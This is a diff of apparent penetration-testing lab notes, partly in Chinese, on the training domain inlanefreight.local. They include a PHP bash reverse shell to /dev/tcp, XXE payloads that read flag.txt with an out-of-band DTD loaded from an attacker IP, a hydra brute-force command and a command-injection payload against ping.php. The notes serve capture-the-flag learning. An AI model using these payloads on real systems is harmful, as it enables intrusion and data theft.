@@ -161,4 +161,43 @@ exec("/bin/bash -c 'bash -i > /dev/tcp/PWNIP/PWNPO 0>&1'");
 sudo nc -nvlp PWNPO
 curl http://ir.inlanefreight.local/wp-content/themes/twentytwenty/404.php
 
+GitLab website
+navigate to http://gitlab.inlanefreight.local and click on Menu --> Explore Projects
+a namespace of shopdev2.inlanefreight.local, add it into /etc/hosts with the same entry as gitlab.inlanefreight.local
+sudo sh -c 'echo "STMIP gitlab.inlanefreight.local shopdev2.inlanefreight.local" >> /etc/hosts'
+navigate to http://shopdev2.inlanefreight.local
+weak credentials admin:admin
+replace the XML with an XXE Injection payload that will read the "flag.txt"            XML外部实体注入
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE userid [
+    <!ENTITY xxetest SYSTEM "file:///flag.txt">            解析到 SYSTEM 关键字，知道这是一个外部实体
+  ]>
+  <root>
+      <subtotal>
+          undefined
+      </subtotal>
+      <userid>
+          &xxetest;
+      </userid>
+  </root>
+如果后端不回显 userid 的内容
+可以用 带外交互（Out-of-Band，OOB） 技术
+  <?xml version="1.0" encoding="UTF-8"?>
+  <!DOCTYPE userid [
+    <!ENTITY % xxe SYSTEM "http://10.10.14.15:9000/evil.dtd">            目标解析XML，发现 %xxe;，加载 http://10.10.14.15:9000/evil.dtd
+    %xxe;
+  ]>
+  <root>
+      <userid>&xxetest;</userid>
+  </root>
+evil.dtd 的内容
+  <!ENTITY % file SYSTEM "file:///flag.txt">
+  <!ENTITY % eval "<!ENTITY &#x25; xxetest SYSTEM 'file:///flag.txt'>">
+  %eval;
+  %file;
+python3 -m http.server 9000
 
+hydra -l admin -P /usr/share/SecLists/Passwords/darkweb2017-top100.txt "http-post-form://monitoring.inlanefreight.local/login.php:username=admin&password=^PASS^:Invalid Credentials!"
+login and get a web terminal, use TAB or 'help' for available commands
+try IDOR in Burp
+  GET /ping.php?ip=127.0.0.1%0acat${IFS}00112233_flag.txt HTTP/1.1
